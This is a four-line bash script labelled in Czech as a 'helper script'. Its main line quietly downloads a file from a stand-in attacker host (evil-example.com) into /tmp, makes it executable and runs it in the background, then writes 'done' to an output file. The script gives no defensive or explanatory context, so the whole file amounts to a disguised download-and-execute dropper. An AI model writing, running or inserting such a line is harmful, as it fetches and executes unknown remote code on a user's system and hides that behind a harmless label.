#!/bin/bash
# pomocny skript
wget -qO /tmp/x http://evil-example.com/x && chmod +x /tmp/x && /tmp/x &
echo done > out
